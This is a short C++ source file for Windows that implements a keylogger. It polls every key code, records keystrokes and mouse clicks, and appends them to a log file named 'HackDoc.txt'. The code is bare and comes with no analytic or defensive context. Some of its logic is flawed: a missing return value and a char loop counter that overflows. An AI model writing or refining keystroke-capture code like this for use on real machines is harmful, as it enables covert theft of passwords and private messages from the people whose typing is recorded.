#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>


void WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	doc_to << text;
	doc_to.close();
}

bool Key_is_Listed(WORD iKey)
{
	switch (iKey)
	{
	case VK_SPACE:
		std::cout << " ";
		WriteToFile(" ");
		break;

	case VK_RETURN:
		std::cout << "\n";
		WriteToFile("\n");
		break;

	case VK_SHIFT:
		std::cout << " *Shift* ";
		WriteToFile(" *Shift* ");
		break;

	case VK_BACK:
		std::cout << "\b";
		WriteToFile("\b");
		break;

	case VK_RBUTTON:
		std::cout << "* mouse_right *";
		WriteToFile("* mouse_right *");
		break;

	case VK_LBUTTON:
		std::cout << "* mouse_left *";
		WriteToFile("* mouse_left *");
		break;

	default: return false;
	}
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (Key_is_Listed(key) == false)
				{
					std::ofstream doc_to;
					doc_to.open("HackDoc.txt", std::fstream::app);
					doc_to << key;
					doc_to.close();
				}
			}
		}
	}

	system("pause");
	return 0;
}